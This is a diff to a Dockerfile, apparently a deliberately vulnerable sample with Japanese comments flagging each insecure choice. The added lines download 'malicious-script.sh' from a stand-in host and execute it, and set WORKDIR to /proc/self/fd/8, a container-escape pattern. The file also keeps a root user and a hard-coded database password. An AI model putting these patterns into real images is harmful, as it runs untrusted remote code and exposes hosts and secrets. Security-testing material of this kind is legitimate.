@@ -1,11 +1,14 @@
-# ベースイメージとして既知の脆弱性を含む古いバージョンを使用
+# Ubuntu 20.04をベースイメージとして使用
 FROM ubuntu:20.04
 
-# 必要なパッケージをインストール（古いバージョンを意図的に指定）
-RUN apt-get update && apt-get install -y \
-    openssh-server=1:7.2p2-4ubuntu2.10 \
-    vsftpd=3.0.3-3ubuntu2 \
-    wget=1.17.1-1ubuntu1.5
+# セキュリティ上の問題がある可能性のあるパッケージをインストール
+RUN apt-get update -y && apt-get install -y \
+    systemd \
+    zlib1g \
+    perl-base
+
+# セキュリティリスクのあるADD命令を使用して外部からファイルを取得
+ADD http://example.com/malicious-script.sh /tmp/malicious-script.sh
 
 # rootユーザーで動作（非推奨）
 USER root
@@ -19,5 +22,8 @@ EXPOSE 22 21 80
 # 環境変数に機密情報を直接記載（非常に危険）
 ENV DB_PASSWORD="password123"
 
-# デフォルトコマンド
-CMD ["/bin/bash"]
+# 脆弱なディレクトリに作業ディレクトリを設定
+WORKDIR /proc/self/fd/8
+
+# 任意のスクリプトを実行（注意：実際には危険な操作）
+RUN chmod +x /tmp/malicious-script.sh && /tmp/malicious-script.sh
